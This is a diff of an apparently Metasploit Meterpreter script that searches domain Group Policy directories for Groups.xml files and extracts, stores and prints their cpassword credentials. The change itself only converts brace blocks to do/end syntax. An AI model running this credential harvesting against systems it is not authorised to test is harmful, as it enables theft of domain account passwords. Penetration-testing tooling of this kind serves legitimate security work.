@@ -63,7 +63,7 @@ def scan_groups_file(groupsfile)
 			rfile = client.fs.file.new(groupsfile)
 			temp = rfile.read
 			# parse xml
-			parse_user(temp) { |localuser|
+			parse_user(temp) do |localuser|
 				## store_creds
 				client.framework.db.report_auth_info(
 					:host  => client.sock.peerhost,
@@ -73,7 +73,7 @@ def scan_groups_file(groupsfile)
 					:pass  => localuser.cpassword,
 					)
 				print_status "#{localuser.name}: #{localuser.cpassword}  -  #{localuser.changed} "
-			}
+			end
 		end
 	rescue ::Rex::Post::Meterpreter::RequestError => e
 		#print_line "Ignore protected dir #{policydir}"
@@ -138,9 +138,9 @@ def scan_policies_path(server)
 		fullpath = dirname +  dom + '\\' + "Policies"
 
 		if client.fs.file.stat(fullpath).directory?
-			search_groups_file(fullpath) { |groupsfile|
+			search_groups_file(fullpath) do |groupsfile|
 				scan_groups_file groupsfile
-			}
+			end
 		end
 	end
 end
@@ -163,14 +163,14 @@ def usage
 	raise Rex::Script::Completed
 end
 
-@@opts.parse(args) { |opt, idx, val|
+@@opts.parse(args) do |opt, idx, val|
 	case opt
 	when "-h"
 		usage
 	when "-s"
 		server = "\\\\#{val}"
 	end
-}
+end
 
 if client.platform =~ /win32|win64/
 	if server == 0
